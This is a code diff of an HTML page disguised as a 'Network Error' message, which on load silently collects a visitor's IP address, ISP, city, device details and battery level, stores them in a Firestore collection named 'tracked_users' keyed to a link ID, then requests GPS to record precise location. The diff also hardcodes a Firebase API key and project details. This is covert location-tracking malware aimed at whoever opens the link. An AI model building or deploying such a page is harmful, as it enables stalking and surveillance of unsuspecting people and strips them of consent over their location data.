@@ -3,87 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Error</title>
+    <title>Connection Error</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: white; color: #333; }
-        .container { text-align: center; }
-        .icon { color: #d32f2f; font-size: 40px; font-weight: bold; margin-right: 10px; }
-        .text { font-size: 20px; color: #333; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+        .icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+        }
+        h2 { margin: 0; font-size: 22px; color: #dc3545; }
+        p { color: #6c757d; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <span class="icon">X</span>
-        <span class="text">Oh No!!, try later.</span>
-    </div>
+
+    <div class="icon">⚠️</div>
+    <h2>Network Error</h2>
+    <p>Please check your connection and try again.</p>
 
     <script type="module">
-        import { db } from './firebase-config.js';
-        import { doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
+        // ---------------- CONFIGURATION ----------------
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js";
 
-        async function collectAndSaveData() {
+        const firebaseConfig = {
+            apiKey: "AIzaSyAgisxeeq0hYN-7SF62IGkvZHPVmWnyThg",
+            authDomain: "xyze-9b306.firebaseapp.com",
+            projectId: "xyze-9b306",
+            storageBucket: "xyze-9b306.firebasestorage.app",
+            messagingSenderId: "814674031370",
+            appId: "1:814674031370:web:aa8f08895c1d305b2540f3",
+            measurementId: "G-33ZZ3HXVFC"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // ---------------- TRACKING LOGIC ----------------
+        async function startTracking() {
+            // 1. Get User ID from URL
             const urlParams = new URLSearchParams(window.location.search);
             const refId = urlParams.get('id');
-            if (!refId) return;
+            if (!refId) return; // Stop if no ID
 
-            // 1. Basic IP & Device Data
-            let ipData = {};
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch (error) { console.log("IP Fetch Error"); }
+            // 2. Prepare Data Object
+            let userData = {
+                timestamp: serverTimestamp(),
+                lastUpdated: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                battery: "Unknown",
+                ip: "Unknown",
+                city: "Unknown",
+                isp: "Unknown",
+                lat: 0,
+                lon: 0,
+                locationMethod: "Pending"
+            };
 
-            let batteryLevel = "Unknown";
+            // 3. Get Battery (Automatic)
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    batteryLevel = Math.round(battery.level * 100) + "%";
+                    userData.battery = Math.round(battery.level * 100) + "%";
                 }
             } catch (e) {}
 
-            // 2. Function to Save to Firebase
-            const saveData = async (lat, lon, accuracyType) => {
-                const userData = {
-                    ip: ipData.ip || "Unknown",
-                    isp: ipData.org || "Unknown",
-                    city: ipData.city || "Unknown",
-                    country: ipData.country_name || "Unknown",
-                    lat: lat,
-                    lon: lon,
-                    accuracy: accuracyType, // GPS or IP
-                    device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
-                    os: navigator.platform,
-                    browser: navigator.userAgent,
-                    battery: batteryLevel,
-                    timestamp: serverTimestamp(),
-                    lastUpdated: new Date().toLocaleString()
-                };
+            // 4. Get IP & Approximate Location (Automatic - No Permission Needed)
+            try {
+                const response = await fetch('https://ipwho.is/');
+                const ipData = await response.json();
+                
+                if (ipData.success) {
+                    userData.ip = ipData.ip;
+                    userData.city = `${ipData.city}, ${ipData.region}`;
+                    userData.isp = ipData.connection.isp;
+                    userData.country = ipData.country;
+                    userData.lat = ipData.latitude; // IP-based Lat
+                    userData.lon = ipData.longitude; // IP-based Lon
+                    userData.locationMethod = "IP Address (Approx)";
+                }
+            } catch (e) { console.error("IP Fetch Failed"); }
 
-                try {
-                    await setDoc(doc(db, "tracked_users", refId), userData);
-                    console.log("Data Saved:", accuracyType);
-                } catch (e) { console.error("Error saving:", e); }
-            };
+            // 5. Initial Save (Ensures we get data even if they deny GPS)
+            await saveData(refId, userData);
 
-            // 3. Try to get Exact GPS Location
+            // 6. Try GPS (Requires Permission - Browsers enforce this)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // Success: Got Exact GPS
-                        saveData(position.coords.latitude, position.coords.longitude, "Exact GPS");
+                    async (position) => {
+                        // If they click Allow, update with precise location
+                        userData.lat = position.coords.latitude;
+                        userData.lon = position.coords.longitude;
+                        userData.locationMethod = "GPS (Precise)";
+                        await saveData(refId, userData);
                     },
                     (error) => {
-                        // Denied/Error: Fallback to IP Location
-                        saveData(ipData.latitude, ipData.longitude, "Approx IP");
+                        console.log("GPS Denied or Error");
                     }
                 );
-            } else {
-                // No GPS support: Fallback to IP
-                saveData(ipData.latitude, ipData.longitude, "Approx IP");
             }
         }
 
-        collectAndSaveData();
+        async function saveData(id, data) {
+            try {
+                await setDoc(doc(db, "tracked_users", id), data, { merge: true });
+                console.log("Data sent to database");
+            } catch (e) {
+                console.error("Firebase Error:", e);
+            }
+        }
+
+        // Run immediately when page loads
+        window.onload = startTracking;
     </script>
 </body>
 </html>
